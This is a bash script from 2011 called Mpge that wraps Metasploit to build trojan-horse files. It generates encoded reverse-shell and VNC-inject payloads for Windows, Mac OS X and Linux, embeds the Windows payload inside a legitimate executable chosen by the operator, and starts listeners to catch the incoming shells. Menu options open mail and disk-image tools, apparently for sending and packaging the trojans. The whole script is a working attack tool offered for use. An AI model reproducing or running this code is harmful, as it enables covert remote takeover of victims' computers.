#!/bin/bash 

##Mpge: Meterpreter Payloads Generator and Encoding by Marco Storti 22 September 2011##
## Wrapper of Meterpreter to create trojan horse files with file extension .exe for Microsoft Windows  
##and trojan horse files for Mac OS X to be inserted in files .app## 
trap "ctrlc" 2

# GENERATE PAYLOADS:
function azione1 () {
/opt/msf/msfpayload windows/meterpreter/reverse_https LHOST=$ip LPORT=$porta  R | msfencode -t exe -e x86/shikata_ga_nai -x $Filename -o $trojan
}
function azione2 () {
/opt/msf/msfpayload windows/vncinject/reverse_http LHOST=$ip LPORT=$porta R | msfencode -e x86/shikata_ga_nai -t exe -x $Filename -o $trojan 
}
function azione3() {
/opt/msf/msfpayload osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$porta X > mac1
chmod +x mac1
}
function azione4() {
/opt/msf/msfpayload osx/ppc/shell_reverse_tcp LHOST=$ip LPORT=$porta  X > mac2 
chmod +x mac2
}
function azione5() {
/opt/msf/msfpayload  linux/x86/shell/reverse_tcp LHOST=$ip LPORT=$porta X >linuxrev 
chmod +x linuxrev
}
#USE PAYLOADS AND ENCODING:
function azione6 () {
/opt/msf/msfconsole -r  /opt/msf/listeners/metrevshell443.rc 
}
function azione7 () {
/opt/msf/msfconsole -r /opt/msf/listeners/vncrevshell.rc 
}
function azione8 (){
/opt/msf/msfconsole -r /opt/msf/listeners/osxrev.rc
}
function azione9(){
/opt/msf/msfconsole -r /opt/msf/listeners/osxppc.rc
}
function azione10(){
/opt/msf/msfconsole -r /opt/msf/listeners/linux.rc
}
#IP Interface
function azione11(){
ifconfig
}
function azione12(){
/Users/marcostorti/Desktop/msf/IP-Scanner.app/Contents/MacOS/./IP\ Scanner
} 
#Results of IP
function azione13(){
/Applications/Mail.app/Contents/MacOS/./Mail
} 
function azione14(){
/Applications/Firefox.app/Contents/MacOS/./firefox mail.tiscali.it
}
function azione15 () {
/Applications/Firefox.app/Contents/MacOS/./firefox www.yougetsignal.com/tools/visual-tracert
} 
function azione16 () {
/Applications/Utilities/Disk\ Utility.app/Contents/MacOS/./Disk\ Utility 
} 
function ctrlc () {
echo "ctrl+c pressed ... interrupt the function and go back to Menu"
continue 100
}
echo Insert IP address:
$ip
read ip
echo Insert Port:
$porta
read porta
echo Insert Original-filename:
$Filename
read Filename
echo Insert Trojan-filename:
$trojan
read trojan
while true;do
echo "MPGE: Meterpreter Payloads Generator and Encoding 

Payloads and Encoding:

(1) Microsoft Windows Reverse Shell (2) Microsoft Windows Vncinject Reverse Shell 
(3) Mac OS X x86 Reverse Shell (4) Mac OS X PowerPC Reverse Shell
(5) Linux Reverse Shell

Starting Payloads:

(6) Microsoft Windows Reverse Shell (7) Microsoft Windows Vncinject Reverse Shell
(8) Mac OS X x86 Reverse Shell (9) Mac OS X PowerPC Reverse Shell
(10) Linux Reverse Shell

(11) IP Interface (12) Status of IP (13) Send Mail (14) Result of IP (15) VisualRoute

(16) Creation of files .dmg 
##########################################################################
push 0 to exit"
read scelta
case $scelta in
1) azione1;;
2) azione2;;
3) azione3;;
4) azione4;;
5) azione5;;
6) azione6;;
7) azione7;;
8) azione8;;
9) azione9;;
10) azione10;;
11) azione11;;
12) azione12;;
13) azione13;;
14) azione14;;
15) azione15;;
16) azione16;;
0) exit;;
*) echo "errore";;
esac
done

